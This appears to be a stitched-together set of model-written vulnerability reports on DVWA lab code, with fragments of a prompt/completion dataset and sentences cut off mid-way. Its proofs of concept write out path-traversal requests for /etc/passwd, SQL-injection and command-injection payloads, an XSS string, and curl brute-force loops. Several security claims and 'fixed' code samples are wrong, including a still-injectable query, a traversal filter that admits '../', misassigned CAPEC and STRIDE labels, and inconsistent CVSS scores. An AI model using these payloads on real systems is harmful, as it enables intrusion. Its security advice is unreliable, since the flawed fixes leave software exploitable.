The script takes two parameters, 'id' and 'security', and uses them to retrieve the source code of the corresponding vulnerability.

An attacker can manipulate the 'id' and 'security' parameters to include arbitrary files from the server, including sensitive files such as configuration files, password files, and other files that contain sensitive information. \nThreat Model: The vulnerability can be exploited using the STRIDE methodology. An attacker can use Spoofing to impersonate a legitimate user and send a crafted request to the server. The attacker can then use Tampering to modify the 'id' and 'security' parameters to include arbitrary files. The attacker can then use Information Disclosure to read the contents of the included files, which can lead to the disclosure of sensitive information. \nProof of Concept: To exploit this vulnerability, an attacker can send a request to the server with the following parameters: \n?id=../../../../../../etc/passwd&security=../../../../../../etc/passwd\nThis will include the /etc/passwd file and display its contents on the page. \nTaint Analysis: The user-controlled input ($_GET['id'] and $_GET['security']) is used to construct a file path and read the contents of the file using file_get_contents().

The script loads a vulnerability file based on the security level set in the DVWA application. The vulnerability file contains code that allows unauthorized users to access the user management system.\nIssue: The vulnerability exists in the switch statement that loads the vulnerability file. When the security level is set to 'impossible', the script sets the $vulnerabilityFile variable to 'impossible.php' and changes the $method variable to 'POST'. However, the 'impossible.php' file does not exist, so the script loads no file at all. This means that the user management system is accessible to any user, regardless of their authorization level.\nThreat Model: The vulnerability can be described using the STRIDE methodology as Spoofing, as an attacker can spoof their identity to gain unauthorized access to the user management system.\nProof of Concept: To test the vulnerability, set the security level to 'impossible' in the DVWA application and navigate to the 'authbypass' page. The user management system should be accessible to any user, regardless of their authorization level. A proof of concept script is provided below:\n\n```\n#!/bin/bash\n\n# Set security level to 'impossible'\ncurl -s -b \"security=impossible; PHPSESSID=<session_id>\" http://localhost/dvwa/vulnerabilities/authbypass/ > /dev/null\n\n# Attempt to access user management system as non-admin user\ncurl -s -b \"security=impossible; PHPSESSID=<session_id>\" http://localhost/dvwa/vulnerabilities/authbypass/ | grep \"Welcome to the user manager\"\n```\n\nTaint Analysis: The vulnerability can be exploited by any user who can access the 'authbypass' page, regardless of their authorization level. The vulnerability can be exploited by modifying the 'security' cookie value to 'impossible' or by intercepting and modifying the request to set the 'security' parameter to 'impossible'.\nRecommendation: To remediate the vulnerability, the switch statement should be modified to set the $vulnerabilityFile variable to a valid file name when the security level is set to 'impossible'. Additionally, the user management system should be protected by checking the user's authorization level before allowing access to the system.

The objective is to test the system at all four security levels to identify any areas where authorization checks have been missed.

Examples of insecure choices include single words found in dictionaries, family names, any too short password\n\t\t\t(usually thought to be less than 6 or 7 characters), or predictable patterns\n\t\t\t(e.g. alternating vowels and consonants, which is known as leetspeak, so \"password\" becomes \"p@55w0rd\").</p>\n\n\t\t<p>Creating a targeted wordlists, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary\n\t\t\tbased on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).\n\n\t\t<p>A last resort is to try every possible password, known as a brute force attack. In theory, if there is no limit to the number of attempts, a brute force attack will always\n\t\t\tbe successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords\n\t\t\tmaking the attack time longer.</p>\n\n\t\t<br /><hr /><br />\n\n\t\t<h3>Objective</h3>\n\t\t<p>Your goal is to get the administratorâ€™s password by brute forcing. Bonus points for getting the other four user passwords!</p>\n\n\t\t<br /><hr /><br />\n\n\t\t<h3>Low Level</h3>\n\t\t<p>The developer has completely missed out <u>any protections methods</u>, allowing for anyone to try as many times as they wish, to login to any user without any repercussions.</p>\n\n\t\t<br />\n\n\t\t<h3>Medium Level</h3>\n\t\t<p>This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible.</p>\n\n\t\t<p>This will only slow down the amount of requests which can be processed a minute, making it longer to brute force.</p>\n\n\t\t<br />\n\n\t\t<h3>High Level</h3>\n\t\t<p>There has been an \"anti Cross-Site Request Forgery (CSRF) token\" used. There is a old myth that this protection will stop brute force attacks. This is not the case.\n\t\t\tThis level also extends on the medium level, by waiting when there is a failed login but this time it is a random amount of time between two and four seconds.\n\t\t\tThe idea of this is to try and confuse any timing predictions.</p>\n\n\t\t<p>Using a <?php echo dvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/CAPTCHA', 'CAPTCHA' ); ?> form could have a similar effect as a CSRF token.</p>\n\n\t\t<br />\n\n\t\t<h3>Impossible Level</h3>\n\t\t<p>Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a \"lock out\" feature, where if there are five bad logins within\n\t\t\tthe last 15 minutes, the locked out user cannot log in.</p>\n\n\t\t<p>If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know\n\t\t\tif there is a valid account on the system, with that password, and if the account is locked.</p>\n\n\t\t<p>This can cause a \"Denial of Service\" (DoS), by having someone continually trying to login to someone's account.\n\t\t\tThis level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).</p>\n\t</div></td>\n\t</tr>\n\t</table>\n\n\t</div>\n\n\t<br />\n\n\t<p>Reference: <?php echo dvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Password_cracking' ); ?></p>\n</div>\n'", "completion": "Title: Lack of Login Protection\nDescription: The code is a webpage that explains the concept of brute force attacks and provides a login page for users to attempt to brute force login. The code lacks any protection methods, allowing for unlimited login attempts without any repercussions.\nIssue: The issue with the code is that it lacks any login protection methods, making it vulnerable to brute force attacks. An attacker can use automated tools to repeatedly guess passwords until they find the correct one, potentially gaining access to sensitive information.\nThreat Model: The vulnerability can be described using the STRIDE methodology. The threat is a spoofing attack, where an attacker can impersonate a legitimate user by guessing their password. The attacker can also perform a denial of service attack by repeatedly attempting to login, causing the server to become unresponsive.\nProof of Concept: To test the vulnerability, an attacker can use automated tools to repeatedly guess passwords until they find the correct one. A bash script can be used to automate the process:\n\n```\n#!/bin/bash\n\nfor i in {1..1000}\ndo\n   curl -d \"username=admin&password=$i\" -X POST http://example.com/login.php\ndone\n```\n\nTaint Analysis: The exploit is accessible by sending HTTP POST requests to the login.php page with different password guesses.\nRecommendation: To remediate the vulnerability, the code should implement login protection methods such as account lockout after a certain number of failed attempts, CAPTCHA, and CSRF tokens. The following code can be used to implement account lockout:\n\n```\n<?php\nsession_start();\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    if (authenticate($username, $password)) {\n        $_SESSION['authenticated'] = true;\n        $_SESSION['username'] = $username;\n    } else {\n        $_SESSION['attempts']++;\n        if ($_SESSION['attempts'] >= 5) {\n            $_SESSION['locked'] = true;\n            $_SESSION['lock_time'] = time();\n        }\n    }\n}\n\nfunction authenticate($username, $password) {\n    // Authenticate user\n}\n\nfunction is_locked_out() {\n    if ($_SESSION['locked'] && time() - $_SESSION['lock_time'] < 900) {\n        return true;\n    } else {\n        $_SESSION['attempts'] = 0;\n        $_SESSION['locked'] = false;\n        return false;\n    }\n}\n\nif (is_locked_out()) {\n    echo \"You have been locked out. Please try again later.\";\n} else {\n    // Display login form\n}\n?>\n```\n\nThe code above uses session variables to keep track of the number of failed attempts and whether the user is locked out. If the user enters the wrong password five times within 15 minutes, they will be locked out for 15 minutes. The code can be further improved by implementing CAPTCHA and CSRF tokens.\nTaxonomy: The CWE for this vulnerability is CWE-307: Improper Restriction of Excessive Authentication Attempts. The CAPEC is CAPEC-100: Brute Force. \nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)."}

The script uses the mysqli_query function to execute a SQL query that selects all rows from the 'users' table where the 'user' column matches the provided username and the 'password' column matches the MD5 hash of the provided password. If a matching row is found, the script displays the user's avatar and a welcome message. Otherwise, it displays an error message.\nIssue: The code is vulnerable to SQL injection attacks because it directly uses user-controlled input in the SQL query without proper sanitization or parameterization. An attacker can craft a malicious input that alters the query's logic and bypasses the authentication check or even executes arbitrary SQL commands.\nThreat Model: The vulnerability can be exploited using the Injection technique of the STRIDE methodology, where an attacker can inject malicious SQL code into the input fields to manipulate the query's behavior.\nProof of Concept: To exploit the vulnerability, an attacker can use a tool like SQLmap or manually craft a payload that includes SQL code. For example, the following payload can bypass the authentication check and log in as the first user in the 'users' table:\n```\nhttp://example.com/login.php?Login=1&username=admin' OR 1=1 LIMIT 1 -- &password=123456\n```\nThis payload appends the string `' OR 1=1 LIMIT 1 --` to the username input, which makes the query always return the first row in the 'users' table regardless of the password value.

The `$user` and `$pass` variables should be sanitized and parameterized before being used in the query.\nRecommendation: To fix the vulnerability, the code should use prepared statements with placeholders for the input values and bind them separately to avoid SQL injection attacks. Here's an example of the fixed code:\n```\n<?php\nif (isset($_GET['Login'])) {\n    // Get username\n    $user = $_GET['username'];\n\n    // Get password\n    $pass = $_GET['password'];\n    $pass = md5($pass);\n\n    // Check the database\n    $query = \"SELECT * FROM `users` WHERE user = ?

It takes in new and current passwords, checks if the current password is correct, and updates the password in the database if the new password matches the confirmation password and the current password is correct. The passwords are hashed using MD5 before being stored in the database.\nIssue: The use of MD5 for password hashing is insecure and can be easily cracked using rainbow tables. Additionally, the script does not use any salt when hashing the passwords, making it easier for attackers to crack the passwords. \nThreat Model: This vulnerability can be exploited using the STRIDE methodology. An attacker can steal the hashed passwords from the database and use a rainbow table to crack them. Alternatively, an attacker can intercept the password change request and modify the new password to a known value, allowing them to log in as the user.\nProof of Concept: To test this vulnerability, an attacker can intercept the password change request and modify the new password to a known value. Alternatively, the attacker can steal the hashed passwords from the database and use a rainbow table to crack them. A Python script to crack the hashed passwords using a rainbow table is provided below:\n\n```\nimport hashlib\n\n# Load the rainbow table\nrainbow_table = {}\nwith open('rainbow_table.txt', 'r') as f:\n    for line in f:\n        password, hash = line.strip().split(':')\n        rainbow_table[hash] = password\n\n# Load the hashed passwords from the database\nhashed_passwords = []\nwith open('passwords.txt', 'r') as f:\n    for line in f:\n        hashed_passwords.append(line.strip())\n\n# Crack the passwords using the rainbow table\nfor hashed_password in hashed_passwords:\n    if hashed_password in rainbow_table:\n        print('Password for hash', hashed_password, 'is', rainbow_table[hashed_password])\n```\n\nTaint Analysis: The vulnerability can be accessed by intercepting the password change request or stealing the hashed passwords from the database.\nRecommendation: To remediate this vulnerability, the script should use a stronger hashing algorithm such as bcrypt or Argon2. Additionally, a unique salt should be generated for each password and stored in the database along with the hashed password. The salt should be a random value of sufficient length (at least 16 bytes) and should be different for each user. The script should also use prepared statements to prevent SQL injection attacks. The following code shows an example of how to hash passwords using bcrypt and a unique salt:\n\n```\n// Generate a unique salt for the user\n$salt = random_bytes(16);\n\n// Hash the password using bcrypt and the salt\n$hashed_password = password_hash($password, PASSWORD_BCRYPT, ['salt' => $salt]);\n\n// Store the salt and hashed password in the database\n$stmt = $pdo->prepare('INSERT INTO users (username, salt, hashed_password) VALUES (?, ?, ?)');\n$stmt->execute([$username, $salt, $hashed_password]);\n```\n\nTaxonomy: CWE-916: Use of Password Hash with Insufficient Computational Effort, CAPEC-521: Password Brute Forcing. \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 6.5 (Medium). The base score is 5.9 (Medium) due to the use of a weak hashing algorithm and the lack of a salt. The impact score is 6.0 (Moderate) because an attacker can gain access to user accounts by cracking the passwords. The exploitability score is 8.0 (High) because the vulnerability can be easily exploited using a rainbow table."}

The script includes a form that accepts the current password, new password, and confirmation of the new password. The script also includes a button that executes a JavaScript function to test the user's credentials. The vulnerability is in the lack of CSRF protection in the form.\nIssue: The issue with the code is that it does not include any CSRF protection, which means that an attacker can create a malicious website that submits a request to change the user's password without their knowledge or consent.\nThreat Model: The vulnerability can be described using the STRIDE methodology as Spoofing, as an attacker can spoof the user's identity and submit a request to change their password without their knowledge or consent.\nProof of Concept: To test the vulnerability, an attacker can create a malicious website that includes a form that mimics the password change form in the vulnerable code. The form should include hidden fields that contain the user's current password, new password, and confirmation of the new password. When the user visits the malicious website and submits the form, the request will be sent to the vulnerable code, which will change the user's password without their knowledge or consent. A bash script to test the vulnerability is:\n\n```\n#!/bin/bash\n\n# Change these values to match the target environment\nTARGET_URL=\"http://example.com/vulnerabilities/csrf/\"\nUSER_COOKIE=\"PHPSESSID=1234567890abcdef\"\n\n# Craft the malicious request\nMALICIOUS_REQUEST=\"password_current=oldpassword&password_new=newpassword&password_conf=newpassword&Change=Change\"\n\n# Send the request with the user's cookie\ncurl -X POST -d \"$MALICIOUS_REQUEST\" -H \"Cookie: $USER_COOKIE\" $TARGET_URL\n```\n\nTaint Analysis: The exploit is accessible to test by crafting a malicious request that includes the user's current password, new password, and confirmation of the new password. The request can be sent to the vulnerable code using the user's session cookie.\nRecommendation: To remediate the vulnerability, the code should include CSRF protection in the form. This can be done by generating a unique token for each form submission and verifying that the token is valid when the form is submitted. The code should also validate the user's input to prevent SQL injection and other types of attacks. Here is an example of how to add CSRF protection to the form:\n\n```\n<form action=\"#\" method=\"POST\">\n  <?php echo tokenField(); ?>\n  Current password:<br />\n  <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_current\"><br />\n  New password:<br />\n  <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\"><br />\n  Confirm new password:<br />\n  <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br />\n  <br />\n  <input type=\"submit\" value=\"Change\" name=\"Change\">\n</form>\n```\n\nThe `tokenField()` function generates a unique token for each form submission and includes it as a hidden field in the form. The code should also validate the user's input to prevent SQL injection and other types of attacks. Here is an example of how to validate the user's input:\n\n```\n$password_current = mysqli_real_escape_string($GLOBALS['db_con'], $_GET['password_current']);\n$password_new = mysqli_real_escape_string($GLOBALS['db_con'], $_GET['password_new']);\n$password_conf = mysqli_real_escape_string($GLOBALS['db_con'], $_GET['password_conf']);\n\nif ($password_new !== $password_conf) {\n  die(\"New password and confirmation do not match\");\n}\n```\n\nThe `mysqli_real_escape_string()` function escapes special characters in the user's input to prevent SQL injection attacks. The code also checks that the new password and confirmation match before changing the password.\nTaxonomy: The CWE for this vulnerability is CWE-352: Cross-Site Request Forgery (CSRF). The CAPEC for this vulnerability is CAPEC-62: Cross-Site Request Forgery. \nCVSS Score: The CVSS3.1 score for this vulnerability is 8.8 (High)."}

It takes in a username and password from a form and checks if they match a record in the 'users' table of the database. \nIssue: The code is vulnerable to SQL injection attacks because it uses unsanitized user input in the SQL query. Specifically, the username and password variables are concatenated directly into the query string without any validation or sanitization. This allows an attacker to inject malicious SQL code into the query, potentially giving them access to sensitive data or allowing them to modify the database.\nThreat Model: This vulnerability can be described using the STRIDE methodology. An attacker can exploit this vulnerability to gain unauthorized access to the database, which is a violation of confidentiality. They can also modify the database, which is a violation of integrity.\nProof of Concept: To test this vulnerability, an attacker can enter the following string as the username: ' or 1=1;--. This will cause the query to return all records in the 'users' table, effectively bypassing the password check. A bash script to test this vulnerability is:\n\n```\n#!/bin/bash\ncurl -X POST -d \"username=' or 1=1;--&password=test\" http://example.com/login.php\n```\n\nTaint Analysis: The user input is directly used in the SQL query, making it vulnerable to SQL injection attacks.\n\nRecommendation: To remediate this vulnerability, the code should use prepared statements with parameterized queries instead of concatenating user input directly into the query string. This will ensure that user input is properly validated and sanitized before being used in the query. Here is an example of how the code could be modified:\n\n```\n$stmt = $mysqli->prepare(\"SELECT * FROM `users` WHERE user=? AND password=?\");\n$stmt->bind_param(\"ss\", $user, $pass);\n$stmt->execute();\n$result = $stmt->get_result();\n```\n\nTaxonomy: This vulnerability can be classified as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')) and CAPEC-66 (SQL Injection). \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (High) with the following vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H."}

It takes input from the user through GET requests and updates the password in the database. \nIssue: The code lacks proper input validation, which can lead to various vulnerabilities such as SQL injection, cross-site scripting (XSS), and command injection. The code uses the stripslashes() function to sanitize the input, which is not enough to prevent SQL injection attacks. Additionally, the code does not validate the length or complexity of the new password, which can lead to weak passwords. \nThreat Model: The lack of input validation can lead to various attacks such as SQL injection, XSS, and command injection. An attacker can exploit this vulnerability by injecting malicious code or commands through the input fields, which can lead to data theft, privilege escalation, or complete compromise of the web application. \nProof of Concept: To test this vulnerability, an attacker can inject SQL code in the password fields such as ' OR 1=1;--.

The threat is Spoofing, as the attacker can impersonate a legitimate user. The attacker can also Tamper with the system by executing arbitrary commands. The attacker can also Repudiate the system by hiding their tracks. The attacker can also gain Information Disclosure by accessing sensitive information on the system. The attacker can also cause Denial of Service by executing resource-intensive commands. The attacker can also gain Elevation of Privilege by executing commands with higher privileges.\nProof of Concept: To test the vulnerability, an attacker can inject a command into the input field. For example, an attacker can inject the command \"127.0.0.1 && dir\" to list the contents of the current directory. A bash script proof of concept is provided below:\n\n```\n#!/bin/bash\ncurl -X POST http://vulnerable-website.com/command-injection.php -d \"input=127.0.0.1 && dir\"\n```\n\nTaint Analysis: The exploit is accessible by injecting a command into the input field of the vulnerable web application.\n\nRecommendation: To remediate the vulnerability, the code should implement proper input validation and sanitization. The code should also use parameterized queries to prevent SQL injection attacks. The code should also use prepared statements to prevent command injection attacks. The code should also use a whitelist approach to input validation, only allowing certain values. The following code snippet shows an example of how to fix the vulnerability:\n\n```\n$input = $_POST['input'];\n$allowed_commands = array('dir', 'ls', 'whoami');\nif (in_array($input, $allowed_commands)) {\n    // execute command\n} else {\n    // handle error\n}\n```\n\nTaxonomy: The Common Weakness Enumeration (CWE) for this vulnerability is CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'). The Common Attack Pattern Enumeration and Classification (CAPEC) for this vulnerability is CAPEC-88: Command Injection. \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 9.8 (Critical)."}

This proves that the vulnerability can be exploited to execute arbitrary code.\nTaint Analysis: The input parameter \"page\" is tainted because it is used to include files without proper validation. The input can be modified by an attacker to include arbitrary files.\nRecommendation: To remediate the vulnerability, the code should validate the input parameter \"page\" to ensure that it only includes files from a trusted directory. The code should also sanitize the input to prevent directory traversal attacks. The following code shows an example of how to fix the vulnerability:\n\n<?php\n$allowed_pages = array(\"home.php\", \"about.php\", \"contact.php\");\n$page = $_GET['page'];\nif (in_array($page, $allowed_pages)) {\n    include($page);\n} else {\n    echo \"Invalid page requested\";\n}\n?>\n\nThe code validates the input parameter \"page\" against a list of allowed pages. If the input is not in the list, the code displays an error message. This prevents the inclusion of arbitrary files and mitigates the vulnerability. The code should also sanitize the input using functions like \"realpath\" and \"basename\" to prevent directory traversal attacks.\nTaxonomy: The vulnerability is a CWE-98: Improper Control of Filename for Include/Require Statement in PHP. The vulnerability can also be classified as CAPEC-242: Manipulating Input to File System Calls. \nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (High). The score is based on the following metrics: Attack Vector (AV:N), Attack Complexity (AC:L), Privileges Required (PR:N), User Interaction (UI:N), Scope (S:C), Confidentiality (C:N), Integrity (I:N), and Availability (A:H)."}

For example, the URL 'http://example.com/index.php?page=../../etc/passwd' can be used to access the '/etc/passwd' file on the server. A bash script to test this vulnerability is:\n\n```\n#!/bin/bash\ncurl 'http://example.com/index.php?page=../../etc/passwd'\n```\n\nTaint Analysis: The user input from the 'page' parameter is directly assigned to the $file variable without any sanitization or validation. This makes the $file variable tainted and can be used to perform directory traversal attacks.\n\nRecommendation: To remediate this vulnerability, the input validation should be improved by using a whitelist approach. Only allow specific characters and patterns in the user input and reject any input that does not match the whitelist. Additionally, the user input should be sanitized by removing any special characters or encoding them properly. A fixed version of the code can be:\n\n```\n<?php\n\n// The page we wish to display\n$file = $_GET[ 'page' ];\n\n// Input validation\n$allowed_chars = '/^[a-zA-Z0-9_\\-\\.\\/]+$/';\nif (!preg_match($allowed_chars, $file)) {\n    die(\"Invalid input\");\n}\n\n// Sanitize input\n$file = filter_var($file, FILTER_SANITIZE_STRING);\n\n?>\n```\n\nTaxonomy: The CWE for this vulnerability is CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). The CAPEC is CAPEC-66: Path Traversal. \n\nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (High) with the following vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N."}

The token is used to validate the form submission and prevent CSRF attacks. The token is generated differently based on the security level set in the application.\nIssue: The token generation is insecure and can be easily predicted or brute-forced. In the low security level, the token is generated using a simple string rotation and MD5 hash. In the medium security level, the token is generated by reversing the string \"XXsuccessXX\". In the high security level, the token is generated by hashing the string \"XXsuccessXX\" twice with SHA256 and concatenating it with the string \"ZZ\". All of these methods are weak and can be easily predicted or brute-forced.\nThreat Model: This vulnerability can be exploited using the CSRF attack vector in the STRIDE methodology.\nProof of Concept: To exploit this vulnerability, an attacker can simply predict or brute-force the token and use it to submit a form with malicious data. A bash script to brute-force the token can be created as follows:\n\n```\n#!/bin/bash\n\nurl=\"http://example.com/vulnerabilities/javascript/${vulnerabilityFile}\"\ntoken=\"\"\n\nwhile true; do\n    token=$(echo -n \"${token}a\" | md5sum | cut -d ' ' -f 1)\n    curl -s -X POST \"${url}\" -d \"phrase=success&token=${token}\" | grep -q \"Well done!\"\n    if [ $? -eq 0 ]; then\n        echo \"Token found: ${token}\"\n        break\n    fi\ndone\n```\n\nThis script will keep generating tokens by appending the letter \"a\" to the previous token and hashing it with MD5 until a valid token is found. The script can be modified to target the medium and high security levels as well.\nTaint Analysis: The token is generated in the PHP script and is accessible to the attacker through the form submission.\nRecommendation: The token generation should be improved to use a cryptographically secure random number generator and a secure hashing algorithm such as SHA256. The token should also be unique for each form submission and should have a short expiration time to prevent replay attacks. The following code can be used to generate a secure token:\n\n```\n$token = bin2hex(random_bytes(16));\n$hash = hash('sha256', $token);\n$token = $hash . $token;\n```\n\nThis code generates a 32-character token by generating 16 random bytes and converting them to a hexadecimal string. The token is then hashed with SHA256 and the hash is concatenated with the original token to create a 64-character token. This token is unique and secure and can be used to prevent CSRF attacks.\nTaxonomy: CWE-352: Cross-Site Request Forgery (CSRF) and CAPEC-62: Cross-Site Request Forgery (CSRF)"}

The page has different levels of difficulty, and the objective is to submit the phrase \"success\" to win the level. The JavaScript code generates a token that must match with the phrase to win the level. The code does not validate the input phrase, which can lead to security issues.\nIssue: The lack of input validation can allow an attacker to submit malicious input, such as code injection or cross-site scripting (XSS) attacks. An attacker can manipulate the input phrase to bypass the protection mechanisms and win the level without actually solving the challenge.\nThreat Model: The vulnerability can be described using the STRIDE methodology. The lack of input validation can lead to Spoofing, Tampering, and Elevation of Privilege attacks. An attacker can spoof the input phrase to bypass the protection mechanisms, tamper with the code to inject malicious code, or elevate their privileges to gain unauthorized access to the system.\nProof of Concept: To test the vulnerability, an attacker can submit a malicious input phrase that contains code injection or XSS attacks. For example, an attacker can submit the following input phrase: \"<script>alert('XSS')</script>\". The attacker can then bypass the protection mechanisms and win the level without actually solving the challenge. A bash script proof of concept can be:\n\n```\n#!/bin/bash\n\ncurl -X POST -d \"phrase=<script>alert('XSS')</script>\" http://target.com/level\n```\n\nTaint Analysis: The exploit is accessible by submitting a malicious input phrase that contains code injection or XSS attacks. The input phrase is not validated, which allows the attacker to bypass the protection mechanisms and win the level without actually solving the challenge.\n\nRecommendation: To remediate the vulnerability, the code must validate the input phrase to prevent code injection and XSS attacks. The code can use regular expressions or input sanitization to validate the input phrase. The following code snippet shows an example of input validation using regular expressions:\n\n```\nfunction validatePhrase(phrase) {\n  var regex = /^[a-zA-Z0-9]+$/;\n  return regex.test(phrase);\n}\n\nif (validatePhrase(phrase)) {\n  // generate token and check if it matches with the phrase\n  // ...\n} else {\n  // handle invalid input\n  // ...\n}\n```\n\nTaxonomy: The vulnerability can be classified as CWE-20: Improper Input Validation and CAPEC-242: Manipulating User-Controlled Variables.\n\nCVSS Score: The CVSS3.1 score for this vulnerability is 6.1 (Medium).

For example, the following request will retrieve all data from the users table:\n```\nhttp://example.com/vulnerabilities/sqli/?id=1%20OR%201=1%20--\n```\nA Python script that demonstrates the vulnerability is shown below:\n```\nimport requests\n\nurl = 'http://example.com/vulnerabilities/sqli/'\nparams = {'id': \"1' OR 1=1 -- \"}\nresponse = requests.get(url, params=params)\nprint(response.text)\n```\nTaint Analysis: The user input is tainted and used in a SQL query without proper validation or sanitization, allowing an attacker to inject SQL code.\nRecommendation: To remediate the vulnerability, the code should validate and sanitize all user input before using it in a SQL query. The recommended approach is to use prepared statements with parameterized queries, which separate the SQL code from the user input and prevent SQL injection attacks. The following code shows an example of using prepared statements with parameterized queries:\n```\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);\n```\nTaxonomy: The vulnerability can be classified as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) and CAPEC-66 (SQL Injection).\nCVSS Score: The CVSS3.1 score for this vulnerability is 9.8 (Critical) with the following vector string: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H."}

The application has different levels of difficulty, from low to impossible. The attacker can steal data by asking a series of True and False questions through SQL statements, and monitoring how the web application response (valid entry returned or 404 header set).\nIssue: The SQL query uses RAW input that is directly controlled by the attacker. All they need to do is escape the query and then they are able to execute any SQL query they wish. The medium level uses a form of SQL injection protection, with the function of \"mysql_real_escape_string()\". However, due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered. The high level is very similar to the low level, however, this time the attacker is inputting the value in a different manner. The input values are being set on a different page, rather than a GET request. The impossible level uses parameterized queries (rather than being dynamic).\nThreat Model: The vulnerability can be described using the STRIDE methodology. The attacker can steal data by asking a series of True and False questions through SQL statements, and monitoring how the web application response (valid entry returned or 404 header set). This can lead to data theft, data manipulation, and denial of service attacks.\nProof of Concept: To test the vulnerability, an attacker can input SQL queries in the input fields and monitor the web application response. A bash script can be used to automate the process. For example, an attacker can input \"?id=1' AND sleep 5&Submit=Submit\" in the low level input field to execute a sleep command. The same can be done for the medium and high levels.\nTaint Analysis: The exploit is accessible through the input fields of the web application.\nRecommendation: To remediate the vulnerability, the application should use parameterized queries and input validation to prevent SQL injection attacks. The code should be updated to use prepared statements and stored procedures. The application should also sanitize user input to prevent cross-site scripting attacks. Here is an example of how to fix the low level vulnerability:\n\n```\n<?php\n$id = $_GET['id'];\n$id = mysqli_real_escape_string($conn, $id);\n$sql = \"SELECT * FROM users WHERE id = $id\";\n$result = mysqli_query($conn, $sql);\n?>\n```\n\nTaxonomy: The CWE for this vulnerability is CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')). The CAPEC for this vulnerability is CAPEC-66 (SQL Injection). \nCVSS Score: The CVSS3.1 score for this vulnerability is 9.8 (Critical)."}

The attacker can also use this vulnerability to launch denial of service attacks by injecting malicious SQL code that can cause the database to crash or become unresponsive.\nProof of Concept: To test the vulnerability, an attacker can input the following value for the user ID: ' OR 1=1;--\nThis will result in the following SQL query being executed:\nSELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1;--';\nThe double dash at the end of the query is used to comment out the rest of the query, which can prevent syntax errors.\nTo demonstrate the vulnerability, a proof of concept script can be written in Python:\n```\nimport requests\n\nurl = 'http://example.com/script.php'\ndata = {'id': \"' OR 1=1;--\", 'Submit': 'Submit'}\nresponse = requests.post(url, data=data)\n\nprint(response.text)\n```\nTaint Analysis: The vulnerability can be exploited by manipulating the user ID input to inject malicious SQL code into the query. The user ID input is not properly sanitized before being used in the SQL query, which can allow an attacker to inject SQL code.\nRecommendation: To remediate the vulnerability, the user input should be properly sanitized before being used in the SQL query. One way to do this is to use prepared statements, which can prevent SQL injection attacks by separating the SQL code from the user input. The code can be modified as follows:\n```\n$id = $_POST[ 'id' ];\n$exists = false;\n\nswitch ($_DVWA['SQLI_DB']) {\n    case MYSQL:\n        $stmt = mysqli_prepare($GLOBALS[\"___mysqli_ston\"], \"SELECT first_name, last_name FROM users WHERE user_id = ?\");\n        mysqli_stmt_bind_param($stmt, \"s\", $id);\n        mysqli_stmt_execute($stmt);\n        $result = mysqli_stmt_get_result($stmt);\n        $exists = mysqli_num_rows($result) > 0;\n        break;\n    case SQLITE:\n        global $sqlite_db_connection;\n        $stmt = $sqlite_db_connection->prepare(\"SELECT first_name, last_name FROM users WHERE user_id = ?\");\n        $stmt->bindValue(1, $id, SQLITE3_TEXT);\n        $result = $stmt->execute();\n        $exists = $result->fetchArray() !== false;\n        break;\n}\n\nif ($exists) {\n    // Feedback for end user\n    $html .= '<pre>User ID exists in the database.</pre>';\n} else {\n    // Feedback for end user\n    $html .= '<pre>User ID is MISSING from the database.</pre>';\n}\n```\nThis code uses prepared statements to separate the SQL code from the user input. The user input is bound to a parameter in the prepared statement, which can prevent SQL injection attacks. The code also uses parameterized queries to prevent SQL injection attacks.\nTaxonomy: The vulnerability can be classified as CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') and CAPEC-66: SQL Injection. \nCVSS Score: The CVSS3.1 score for this vulnerability is 7.5 (High). The score is based on the following metrics: Attack Vector (AV): Network (N), Attack Complexity (AC): Low (L), Privileges Required (PR): None (N), User Interaction (UI): Required (R), Scope (S): Unchanged (U), Confidentiality (C): High (H), Integrity (I): None (N), Availability (A): None (N)."}

